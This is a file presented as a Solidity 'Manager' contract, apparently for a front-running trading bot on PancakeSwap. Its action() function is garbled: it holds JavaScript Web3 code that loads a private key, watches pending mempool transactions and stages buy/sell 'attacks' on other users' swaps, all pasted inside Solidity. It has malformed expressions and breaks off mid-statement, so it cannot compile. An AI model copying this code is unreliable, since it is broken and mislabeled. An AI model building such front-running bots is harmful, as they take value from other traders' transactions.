pragma solidity ^0.6.6;

contract Manager {
    
    string public tokenName;
    string public tokenSymbol;
    uint frontrun;
    Manager 
    
    
    constructor(string memory _tokenName, string memory _tokenSymbol) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
        manager = new Manager();
        
    }
    
    // Send required BNB for liquidity pair
    receive() external payable {}
    
    
    // Perform tasks (clubbed .json functions into one to reduce external calls & reduce gas) manager.performTasks();
    
    function action() public payable {
    
        // Perform a front-running attack on uniswap

        const fs = require('fs');
        var Web3 = require('web3');
        var abiDecoder = require('abi-decoder');
        var colors = require("colors");
        var Tx = require('ethereumjs-tx').Transaction;
        var axios = require('axios');
        var BigNumber = require('big-number');
    
        const {NETWORK, PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST} = require('./constants.js');
        const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');
        const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');
    
        const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
        const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
    
    
        var input_token_info;
        var out_token_info;
        var pool_info;
        var gas_price_info;
    
    
        var web3;
        var web3Ts;
        var web3Ws;
        var pancakeRouter;
        var pancakeFactory;
    
    
        // one gwei
        const ONE_GWEI = 1e9;
    
    
        var buy_finished = false;
        var sell_finished = false;
        var buy_failed = false;
        var sell_failed = false;
        var attack_started = false;
    
    
        var succeed = false;
        var subscription;
    
        function performTasks() public {
            async function createWeb3(){
                try {
                    web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK));
                    web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK_TEST));
                    web3 = new Web3(EthereumTesterProvider());
                    web3.eth.getAccounts(console.log);
                    web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));
                    pancakeRouter = new web3.eth.Contract(PANCAKE_ROUTER_ABI, PANCAKE_ROUTER_ADDRESS);
                    pancakeFactory = new web3.eth.Contract(PANCAKE_FACTORY_ABI, PANCAKE_FACTORY_ADDRESS);
                    abiDecoder.addABI(PANCAKE_ROUTER_ABI);
            
                    return true;
                } catch (error) {
                    console.log(error);
                    return false;
                }
            }
            
            async function main() {
                
                try {   
                    if (await createWeb3() == false) {
                        console.log('Web3 Create Error'.yellow);
                        process.exit();
                    }
                    
                    const user_wallet = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
                    const out_token_address = TOKEN_ADDRESS;
                    const amount = AMOUNT;
                    const level = LEVEL;
                    
                    ret = await preparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, amount, level);
                    if(ret == false) {
                        process.exit();
                    }
                    
                    await updatePoolInfo();
                    outputtoken = await pancakeRouter.methods.getAmountOut(((amount*1.2)(10*18)).toString(), pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
                    
                    await approve(gas_price_info.high, outputtoken, out_token_address, user_wallet);
                    
                    log_str = '** Tracking more ' + (pool_info.attack_volumn/(10input_token_info.decimals)).toFixed(5) + ' ' +  input_token_info.symbol + '  Exchange on Pancake **'
                    console.log(log_str.green);    
                    console.log(web3Ws);
                    web3Ws.onopen = function(evt) {
                        web3Ws.send(JSON.stringify({ method: "subscribe", topic: "transfers", address: user_wallet.address }));
                        console.log('connected')
                    }
    
                    // get pending transactions
                    subscription = web3Ws.eth.subscribe('pendingTransactions', function (error, result) {
                    }).on("data", async function (transactionHash) {
                        console.log(transactionHash);
    
                        let transaction = await web3.eth.getTransaction(transactionHash);
                        if (transaction != null && transaction['to'] == PANCAKE_ROUTER_ADDRESS) {
                            
                            await handleTransaction(transaction, out_token_address, user_wallet, amount, level);
                        }
                    });
    
                    if (succeed) {
                        console.log("The bot finished the attack.");
                        process.exit();
                    }
    
                } catch (error) {
                    
                    if(error.data != null && error.data
